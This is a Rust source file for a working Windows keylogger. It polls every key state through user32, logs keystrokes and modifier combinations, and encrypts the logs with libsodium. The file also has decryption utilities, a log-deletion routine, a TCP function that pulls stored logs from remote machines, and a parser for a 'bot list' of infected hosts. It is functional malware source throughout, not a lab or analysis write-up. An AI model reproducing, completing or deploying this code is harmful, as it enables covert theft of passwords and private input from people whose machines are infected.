extern crate user32;
//#[link(name = "sodium", kind = "static")]
extern crate sodiumoxide;
extern crate time;
extern crate termsize;

mod win_key_codes;

use win_key_codes::*;
use sodiumoxide::crypto::secretbox;
use sodiumoxide::crypto::sealedbox;
use sodiumoxide::crypto::box_;

use std::io::Write;
use std::io::Read;
use std::collections::HashMap;

const LOG_LINE_LENGTH: usize = 140;
const SEALBYTES: usize = 48;


pub enum EncryptionType {
    Symmetric(String),
    Asymmetric(String),
    Both { pub_key_loc: String, sym_key_loc: String },
}

//pub struct KeysInput<'a> {
//    secret_key_path: &'a str,
//    public_key_path: &'a str,
//    asymmetric: bool,
//}

pub fn key_log(encryption_type: &EncryptionType) {
//    sodiumoxide::init();
//    println!("{}", sodiumoxide::version::version_string());
//    let (pub_key_1, sec_key_1) = box_::gen_keypair();
//    let encrypted = sealedbox::seal(b"abcdefg",&pub_key_1);
//    print_in_hex(&encrypted);
//    println!("{}", encrypted.len());
//
//    let decrypted = sealedbox::open(encrypted.as_ref(),&pub_key_1, &sec_key_1).expect("Decryption Error");
//    print_in_hex(&decrypted);
//    return;
    let mut to_write_queue = String::new();

    let mut key_downed: HashMap<u8, bool> = HashMap::new();
    loop {
        std::thread::sleep(std::time::Duration::from_millis(20));
        for i in 8..255u8 {
            let is_current_key_down: bool;
            let capslock_on: bool;
            unsafe {
                is_current_key_down = user32::GetAsyncKeyState(i as i32) & (1 << 15) != 0;
                capslock_on = user32::GetKeyState(VK_CAPITAL as i32) & 1 != 0
            }
            if is_current_key_down {
                key_downed.insert(i, true);
            } else if *key_downed.get(&i).unwrap_or(&false) {
                key_downed.insert(i, false);

                let shift_status = key_downed.get(&VK_SHIFT).unwrap_or(&false);
                let ctrl_status = key_downed.get(&VK_CONTROL).unwrap_or(&false);
                let alt_status = key_downed.get(&VK_MENU).unwrap_or(&false);

                let mut current_str = match i {
                    0x30 ... 0x5A | VK_SPACE => {
                        let mut current_char = (i as char).to_string();
                        if !(*shift_status ^ capslock_on) {
                            current_char = current_char.to_lowercase();
                        }
                        current_char
                    }
                    VK_BACK => "[Backspace]".to_string(),
                    VK_TAB => "[Tab]".to_string(),
                    VK_OEM_2 => "/".to_string(),
                    VK_ESCAPE => "[Esc]".to_string(),
                    VK_RETURN => "[Enter]\n".to_string(),
                    VK_LEFT => "[Left]".to_string(),
                    VK_RIGHT => "[Right]".to_string(),
                    VK_UP => "[Up]".to_string(),
                    VK_DOWN => "[Down]".to_string(),
                    VK_DELETE => "[Delete]".to_string(),
                    0xA0 ... 0xA5 | VK_SHIFT | VK_MENU | VK_CONTROL => "".to_string(),
                    _ => { "[Not Impl]".to_string() }
                };

                if *ctrl_status | *alt_status {
                    current_str = format!("[{}{}{}{}]",
                                          if *ctrl_status { "Ctrl + " } else { "" },
                                          if *shift_status { "Shift + " } else { "" },
                                          if *alt_status { "Alt + " } else { "" },
                                          current_str.to_uppercase());
                    current_str += "\n";
                }
                save_string_to_queue(&current_str, &mut to_write_queue, encryption_type)
            }
        }
    }
}

fn save_string_to_queue(to_write: &String, string_queue: &mut String, encryption_type: &EncryptionType) {
    if to_write.is_empty() { return; }
    string_queue.push_str(to_write);

    if string_queue.len() < 100 { return; }
    let string_queue_owned = pad(string_queue, LOG_LINE_LENGTH, '-', true);
    string_queue.clear();
    save_encrypted_to_disk(
        match encryption_type {
            &EncryptionType::Asymmetric(ref key_loc) => encrypt_asym(string_queue_owned.as_bytes(), &key_loc),
            &EncryptionType::Symmetric(ref pub_key_loc) => encrypt_sym(string_queue_owned.as_bytes(), &pub_key_loc),
            &EncryptionType::Both { ref pub_key_loc, ref sym_key_loc } => encrypt_asym(&encrypt_sym(string_queue_owned.as_bytes(), &sym_key_loc), &pub_key_loc)
        })
}

fn encrypt_sym(data_to_encrypt: &[u8], key_loc: &str) -> Vec<u8> {
    let (key, nonce) = generate_key_and_nonce(key_loc).expect("Key file incorrect");
    let mut output: Vec<u8> = nonce[..].to_vec();
    output.extend(secretbox::seal(data_to_encrypt, &nonce, &key));
    output
}

fn encrypt_asym(data_to_encrypt: &[u8], key_loc: &str) -> Vec<u8> {
    let pub_key = get_public_key(key_loc).expect("Key file incorrect");
    sealedbox::seal(data_to_encrypt, &pub_key)
}

fn save_encrypted_to_disk(data_to_write: Vec<u8>) {
    let now = time::now();
    std::fs::create_dir("./logs").unwrap_or_default();

    let mut file = std::fs::OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open(format!("./logs/{:05}-{:02}-{:02}_Keylogs.crypt", now.tm_year + 11900, now.tm_mon, now.tm_mday)).expect("Failed to open file");

    file.write(data_to_write.as_ref()).expect("Can't write to file");
}

fn pad(original: &String, width: usize, pad_char: char, truncate: bool) -> String {
    if width <= original.len() { if truncate { return original[..width].to_string(); } else { return original.to_string(); } }
    let diff = width - original.len();
    let mut s = original.clone();
    for _ in 0..diff { s.push(pad_char) }
    s
}

pub fn get_public_key(pub_key_loc: &str) -> Result<box_::PublicKey, Box<std::error::Error>> {
    let mut contents = Vec::new();
    std::fs::File::open(pub_key_loc)?.read_to_end(&mut contents)?;//.expect("File read error");

    let key = box_::PublicKey::from_slice(&contents[..]).ok_or("Key not the correct size")?;

    return Ok(key);
}

pub fn gen_key_pair(pub_key_loc: &str, sec_key_loc: &str) -> Result<(), Box<std::error::Error>> {
    use sodiumoxide::crypto::box_;
    let (pub_key, sec_key) = box_::gen_keypair();

    let mut creation_options = std::fs::OpenOptions::new();

    creation_options
        .create_new(true)
        .write(true);

    creation_options
        .open(pub_key_loc)
        .or_else(|e| Err(format!("File already exists? : {}", e.to_string())))?
        .write(&pub_key[..])?;

    creation_options
        .open(sec_key_loc)
        .or_else(|e| Err(format!("File already exists? : {}", e.to_string())))?
        .write(&sec_key[..])?;

    Ok(())
}

// TODO: Split this so that key generation and key retrieval is separated
pub fn generate_key_and_nonce(key_loc: &str) -> Result<(secretbox::Key, secretbox::Nonce), Box<std::error::Error>> {
    if let Ok(mut file) = std::fs::File::open(key_loc) {
        let mut contents = Vec::new();
        file.read_to_end(&mut contents)?;//.expect("File read error");

        let key = secretbox::Key::from_slice(&contents[..]).ok_or("Key not the correct size")?;
        let nonce = secretbox::gen_nonce();

        return Ok((key, nonce));
    } else {
        println!("Key file doesn't exist, generating new key");
        let mut file = std::fs::File::create(key_loc)?;

        let key = secretbox::gen_key();
        let nonce = secretbox::gen_nonce();

        file.write(&key[..])?;

        return Ok((key, nonce));
    }
}

pub fn decrypt_asym_sym(log_file_path: &str, pub_key_path: &str, sec_key_path: &str, sym_key_path: &str) -> Result<(), Box<std::error::Error>> {
    use std::io::Read;
    use std::io::BufRead;

    let (pub_key, sec_key, sym_key) = {
        let mut pub_contents = Vec::new();
        let mut sec_contents = Vec::new();
        let mut sym_contents = Vec::new();
        std::fs::File::open(pub_key_path)?.read_to_end(&mut pub_contents)?;
        std::fs::File::open(sec_key_path)?.read_to_end(&mut sec_contents)?;
        std::fs::File::open(sym_key_path)?.read_to_end(&mut sym_contents)?;
        (box_::PublicKey::from_slice(&pub_contents[..(box_::PUBLICKEYBYTES)]).ok_or("Public key not the correct size")?,
         box_::SecretKey::from_slice(&sec_contents[..(box_::SECRETKEYBYTES)]).ok_or("Private key not the correct size")?,
         secretbox::Key::from_slice(&sym_contents[..(secretbox::KEYBYTES)]).ok_or("Symmetric key not the correct size")?)
    };

    let mut log_file = std::io::BufReader::with_capacity(
        LOG_LINE_LENGTH + secretbox::MACBYTES + secretbox::NONCEBYTES + SEALBYTES,
        std::fs::File::open(&log_file_path).expect("Log file not found"));

    println!("{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
    println!("\n    Now reading from: {}\n", log_file_path);
    println!("{}\n", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));

    loop {
        let buffer_length = {
            let data = log_file.fill_buf().expect("Read buffer failed");
            if data.len() == 0 { break; }

            let first_answer = sealedbox::open(data, &pub_key, &sec_key).expect("Decrypt fail");

            let nonce = secretbox::Nonce::from_slice(&first_answer[..secretbox::NONCEBYTES]).expect("Nonce parse fail");
            let final_answer = secretbox::open(&first_answer[secretbox::NONCEBYTES..], &nonce, &sym_key).expect("Decrypt fail");
            let final_answer = String::from_utf8(final_answer).expect("Utf8 parse problem");

            println!("{}", final_answer);
            data.len()
        };
        log_file.consume(buffer_length);
    }
    println!("\n{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
    Ok(())
}

pub fn decrypt_asym(log_file_path: &str, pub_key_path: &str, sec_key_path: &str) -> Result<(), Box<std::error::Error>> {
    use std::io::Read;
    use std::io::BufRead;

    let (pub_key, sec_key) = {
        let mut pub_contents = Vec::new();
        let mut sec_contents = Vec::new();
        std::fs::File::open(pub_key_path)?.read_to_end(&mut pub_contents)?;
        std::fs::File::open(sec_key_path)?.read_to_end(&mut sec_contents)?;
        (box_::PublicKey::from_slice(&pub_contents[..(box_::PUBLICKEYBYTES)]).ok_or("Public key not the correct size")?,
         box_::SecretKey::from_slice(&sec_contents[..(box_::SECRETKEYBYTES)]).ok_or("Private key not the correct size")?)
    };

    let mut log_file = std::io::BufReader::with_capacity(LOG_LINE_LENGTH + SEALBYTES, std::fs::File::open(&log_file_path).expect("Log file not found"));

    println!("{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
    println!("\n    Now reading from: {}\n", log_file_path);
    println!("{}\n", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));

    loop {
        let buffer_length = {
            let data = log_file.fill_buf().expect("Read buffer failed");
            if data.len() == 0 { break; }
            //let nonce = box_::Nonce::from_slice(&data[..box_::NONCEBYTES]).expect("Nonce parse fail");
            let answer = sealedbox::open(data, &pub_key, &sec_key).expect("Decrypt fail");
            //answer.truncate(box_::NONCEBYTES);
            let answer = String::from_utf8(answer).expect("Utf8 parse problem");
            println!("{}", answer);
            data.len()
        };
        log_file.consume(buffer_length);
    }
    println!("\n{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
    Ok(())
}

//TODO: Distill this function so that no file load happens here
pub fn decrypt_sym(log_file_path: &str, key_file_path: &str) -> Result<(), Box<std::error::Error>> {
    use std::io::Read;
    use std::io::BufRead;
    let key: secretbox::Key = {
        let mut contents = Vec::new();
        std::fs::File::open(key_file_path)?.read_to_end(&mut contents)?;
        secretbox::Key::from_slice(&contents[..(secretbox::KEYBYTES)]).ok_or("Key not the correct size")?
    };
    let mut file = std::io::BufReader::with_capacity(LOG_LINE_LENGTH + secretbox::MACBYTES + secretbox::NONCEBYTES, std::fs::File::open(&log_file_path).expect("Log file not found"));

    println!("{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
    println!("\n    Now reading from: {}\n", log_file_path);
    println!("{}\n", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
    loop {
        let buffer_length = {
            let data = file.fill_buf().expect("Read buffer failed");
            if data.len() == 0 { break; }
            let nonce = secretbox::Nonce::from_slice(&data[..secretbox::NONCEBYTES]).expect("Nonce parse fail");
            let answer = secretbox::open(&data[secretbox::NONCEBYTES..], &nonce, &key).expect("Decrypt fail");
            let answer = String::from_utf8(answer).expect("Utf8 parse problem");
            println!("{}", answer);
            data.len()
        };
        file.consume(buffer_length);
    }
    println!("\n{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
    Ok(())
}

// Delete all logs, ignore any problems.
pub fn delete_all_logs(logs_folder: &str) -> Result<(), Box<std::error::Error>> {
    for path in std::fs::read_dir(logs_folder)? {
        let path = path.unwrap().path();
        if std::fs::rename(path.to_str().unwrap(), path.to_str().unwrap().to_owned() + ".delete").is_ok() {
            std::fs::remove_file(path.to_str().unwrap().to_owned() + ".delete").is_ok();
        }
    }
    Ok(())
}

pub fn load_all_key_logs(log_folder_path: &str) -> Result<Vec<(String, Vec<u8>)>, Box<std::error::Error>> {
    let paths = std::fs::read_dir(log_folder_path)?;
    Ok(paths.filter_map(|name| {
        name.ok().and_then(|path| {
            let path = path.path();
            if path.extension().unwrap_or(std::ffi::OsStr::new(".fail")) == "crypt" {
                return Some((path.file_name().unwrap().to_str().unwrap().to_owned(), load_key_logs(&path.to_str().unwrap()).expect("hmm")));
            }
            None
        })
    }).collect())
}

pub fn load_key_logs(log_file_path: &str) -> Result<Vec<u8>, Box<std::error::Error>> {
    let mut contents = Vec::new();
    std::fs::File::open(log_file_path)?.read_to_end(&mut contents)?;
    Ok(contents)
}

pub fn retrieve_remote_keylogs(addr: &str, public_key: &[u8]) -> Vec<(String, Vec<u8>)> {
    println!("{}", addr);
    let mut stream = std::net::TcpStream::connect(addr).expect("Error connecting");

    stream.write(public_key);

    let mut data = Vec::new();

    stream.read_to_end(&mut data).unwrap();
    if &data == b"Wrong Key" {
        panic!("Public key incorrect");
    }

    let (header, content) = data.split_at(data.iter().position(|item| item == &('\n' as u8)).expect("Header error"));
    let header: Vec<usize> = std::str::from_utf8(header).expect("Header error").split(";").map(|s: &str| s.parse::<usize>().expect("Header error")).collect::<Vec<usize>>();

    let mut true_content: Vec<Vec<u8>> = Vec::new();
    header.iter().fold(1usize, |acc, item| {
        true_content.push(content[acc..(acc + item)].to_vec());
        acc + item
    });
    //println!("Name of [0] = {}", std::str::from_utf8(true_content[0].as_ref()).unwrap());
    let mut output: Vec<(String, Vec<u8>)> = Vec::new();
    for i in 0..true_content.len() / 2 {
        let i = i * 2;
        output.push((std::str::from_utf8(true_content[i].as_ref()).unwrap().to_owned(), true_content[i + 1].clone()));
    }
    output
}


pub fn parse_bot_list(bot_list_path: &str) -> Result<Vec<String>, Box<std::error::Error>> {
    let mut list_data = String::new();
    std::fs::File::open(bot_list_path)?.read_to_string(&mut list_data)?;
    Ok(list_data.split("\n").map(|s: &str| s.trim().to_owned()).collect::<Vec<String>>())
}

fn print_in_hex(input: &Vec<u8>) {
    let mut s = String::new();
    for byte in input {
        s.push_str(&format!("{:X} ", &byte));
    }
    println!("{}", s);
}